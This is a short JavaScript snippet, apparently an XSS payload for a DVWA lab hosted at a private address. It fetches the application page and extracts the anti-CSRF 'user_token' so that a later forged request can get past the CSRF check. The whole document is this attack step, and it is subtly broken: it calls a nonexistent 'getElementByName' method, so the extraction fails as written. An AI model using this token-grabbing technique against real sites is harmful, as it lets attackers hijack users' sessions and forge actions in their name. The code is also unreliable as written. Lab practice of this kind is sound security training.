var xhr1 = new XMLHttpRequest();
xhr1.open("GET","http://192.168.1.8/dvwa",true)
xhr1.responseType='document';
xhr1.send();
xhr1.onload = function(){
if (xhr1.status==200)
{
ddd=xhr1.response;
TOKEN=ddd.getElementByName("user_token");
TOKEN=TOKEN[0].value;
console.log(TOKEN);
}
}
